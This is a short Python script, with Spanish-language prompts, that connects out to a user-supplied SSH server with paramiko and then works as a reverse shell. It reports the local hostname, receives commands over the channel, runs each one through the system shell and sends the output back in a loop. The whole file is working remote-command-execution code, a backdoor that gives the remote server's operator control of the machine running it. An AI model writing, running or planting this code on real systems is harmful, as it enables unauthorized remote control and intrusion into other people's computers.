import paramiko 
import threading 
import subprocess 
import getpass

host = input("Introduce el host: ")
port = input("Introduce el puerto: ")
user = input("Introduce el usuario: ")
passwd = getpass.getpass("Introduce la contraseña: ")

client = paramiko.SSHClient() 
client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
client.connect(host, username=user, password=passwd, port=int(port)) 
chan = client.get_transport().open_session() 
chan.send('Client: '+subprocess.check_output('hostname', shell=True).decode()) 
print(chan.recv(1024)) 
while True: 
    command = chan.recv(1024) 
    if command.lower() == 'exit': 
        print("Server exiting.") 
        break 
    try: 
        result = subprocess.check_output(command, shell=True) 
        chan.send(result) 
    except Exception as e: 
        chan.send(str(e)) 
client.close()
